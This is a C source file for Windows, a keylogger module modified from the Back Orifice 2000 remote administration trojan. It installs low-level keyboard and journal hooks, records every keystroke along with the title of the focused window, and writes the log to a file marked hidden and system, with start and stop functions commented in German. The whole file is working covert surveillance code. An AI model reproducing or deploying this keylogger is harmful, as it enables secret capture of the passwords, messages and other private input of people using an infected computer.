/*  Modified from Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999-2002, Cult Of The Dead Cow
	Copyright (C) 2003-2006, BO2K Development Team

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	This program was written by dildog of Cult of the Dead Cow
	The code is maintained by novice222 at users.sourceforge.net */

#define  WINVER 0x500
#define _WIN32_WINNT 0x500
#include <windows.h>
#include <stdio.h>

BOOL g_bLogging=FALSE;
HANDLE g_hCapFile=NULL;
DWORD g_dwKeyCapTID=0;
HANDLE g_hKeyCapThread=NULL;
HHOOK g_hLogHook=NULL;
HWND g_hLastFocus=NULL;
char g_zLoggerFileName[128];

LRESULT CALLBACK  LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
	HWND hFocus=GetForegroundWindow();

	if(code<0) return CallNextHookEx(g_hLogHook,code,wParam,lParam);

	if(code==HC_ACTION) {
		KBDLLHOOKSTRUCT *pKBst=(KBDLLHOOKSTRUCT *)lParam;
		if(wParam==WM_KEYDOWN) {
			
			DWORD dwCount,dwBytes;
			char svBuffer[256];
			int vKey,nScan;
		
			vKey=pKBst->vkCode;
			nScan=pKBst->scanCode;
			nScan<<=16;
			
			// Check to see if focus has changed			
			if(g_hLastFocus!=hFocus) {
				char svTitle[256];
				int nCount;
				nCount=GetWindowTextA(hFocus,svTitle,256);
				if(nCount>0) {
					char svBuffer[512];
					sprintf(svBuffer,"\r\n-----[ %s ]-----\r\n",svTitle);
					WriteFile(g_hCapFile,svBuffer,strlen(svBuffer),&dwBytes,NULL);
				}
				g_hLastFocus=hFocus;
			}
			
			// Write out key
			dwCount=GetKeyNameTextA(nScan,svBuffer,256);	
			if(dwCount) {
				if(vKey==VK_SPACE) {
					svBuffer[0]=' ';
					svBuffer[1]='\0';
					dwCount=1;
				}
				if(dwCount==1) {
					BYTE kbuf[256];
					WORD ch;
					int chcount;
					
					GetKeyboardState(kbuf);
					
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					if(chcount>0) WriteFile(g_hCapFile,&ch,chcount,&dwBytes,NULL);				
				} else {
					WriteFile(g_hCapFile,"[",1,&dwBytes,NULL);
					WriteFile(g_hCapFile,svBuffer,dwCount,&dwBytes,NULL);
					WriteFile(g_hCapFile,"]",1,&dwBytes,NULL);
					if(vKey==VK_RETURN) WriteFile(g_hCapFile,"\r\n",2,&dwBytes,NULL);
				}
			}			
		}
	}
	return CallNextHookEx(g_hLogHook,code,wParam,lParam);
}

LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam)
{
	HWND hFocus;

	if(code<0) return CallNextHookEx(g_hLogHook,code,wParam,lParam);

	if(code==HC_ACTION) {

		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN) {
			DWORD dwCount,dwBytes;
			char svBuffer[256];
			int vKey,nScan;
		
			vKey=LOBYTE(pEvt->paramL);
			nScan=HIBYTE(pEvt->paramL);
			nScan<<=16;
			
			// Check to see if focus has changed
			hFocus=GetActiveWindow();
			if(g_hLastFocus!=hFocus) {
				char svTitle[256];
				int nCount;
				nCount=GetWindowTextA(hFocus,svTitle,256);
				if(nCount>0) {
					char svBuffer[512];
					sprintf(svBuffer,"\r\n-----[ %s ]-----\r\n",svTitle);
					WriteFile(g_hCapFile,svBuffer,strlen(svBuffer),&dwBytes,NULL);
				}
				g_hLastFocus=hFocus;
			}
			
			// Write out key
			dwCount=GetKeyNameTextA(nScan,svBuffer,256);	
			if(dwCount) {
				if(vKey==VK_SPACE) {
					svBuffer[0]=' ';
					svBuffer[1]='\0';
					dwCount=1;
				}
				if(dwCount==1) {
					BYTE kbuf[256];
					WORD ch;
					int chcount;
					
					GetKeyboardState(kbuf);
					
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					if(chcount>0) WriteFile(g_hCapFile,&ch,chcount,&dwBytes,NULL);				
				} else {
					WriteFile(g_hCapFile,"[",2,&dwBytes,NULL);
					WriteFile(g_hCapFile,svBuffer,dwCount,&dwBytes,NULL);
					WriteFile(g_hCapFile,"]",2,&dwBytes,NULL);
					if(vKey==VK_RETURN) WriteFile(g_hCapFile,"\r\n",2,&dwBytes,NULL);
				}
			}			
		}
	
	}
	return CallNextHookEx(g_hLogHook,code,wParam,lParam);
}

DWORD WINAPI KeyCapThread(LPVOID param)
{
	MSG msg;
	BYTE keytbl[256];
	int i;
	HMODULE g_module=NULL;

	for(i=0;i<256;i++) keytbl[i]=0;
					
	g_hLastFocus=NULL;
	
	g_module=GetModuleHandle(NULL);

	g_hCapFile=CreateFile((wchar_t *)param,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
	if(g_hCapFile==INVALID_HANDLE_VALUE) {
		return -1;
	}
	SetFilePointer(g_hCapFile,0,NULL,FILE_END);

	g_hLogHook=SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,g_module,0);

	if(g_hLogHook==NULL) {
		CloseHandle(g_hCapFile);
		g_hCapFile=NULL;
		return -1;
	}

	g_bLogging=TRUE;
	
	while(g_bLogging) {
		GetMessage(&msg,NULL,0,0);
		if(msg.message==WM_CANCELJOURNAL) {
			
			SetKeyboardState(keytbl);
			g_hLogHook=SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,g_module,0);
			
			if(g_hLogHook==NULL) {
				CloseHandle(g_hCapFile);
				g_hCapFile=NULL;
				return -1;
			}
		} else {
			DispatchMessage(&msg);
		}

	}
	
	UnhookWindowsHookEx(g_hLogHook);
	
	CloseHandle(g_hCapFile);
	g_hCapFile=NULL;
	g_hKeyCapThread=NULL;
	
	return 0;
}

int StartLogger(wchar_t *Filename) {
	if(g_bLogging == TRUE) {		
		/* Logger schon an */
		return -1;
	}

	g_hKeyCapThread=CreateThread(NULL,0,KeyCapThread,(LPVOID)Filename,0,&g_dwKeyCapTID);
	
	if(g_hKeyCapThread==NULL) {		
		/* Fehler beim Starten des Threads */
		return -1;
	}
		
	if(WaitForSingleObject(g_hKeyCapThread,3000)==WAIT_OBJECT_0) {
		/* Falls innerhalb der ersten 3 Sekunden gestorben */
		return -1;
	}
	
	SetThreadPriority(g_hKeyCapThread, THREAD_PRIORITY_LOWEST);
	
	/* Keylogger erfolgreich gestartet */
	return 0;
}

int StopLogger(void)
{
	if(g_bLogging==FALSE)
		return 0;	

	g_bLogging=FALSE;
	PostThreadMessage(g_dwKeyCapTID,WM_LBUTTONUP,0,0);
	if(g_hKeyCapThread!=NULL){
		if(WaitForSingleObject(g_hKeyCapThread,5000)!=WAIT_OBJECT_0) {			
			return -1;
		}
	}
	
	return 0;
}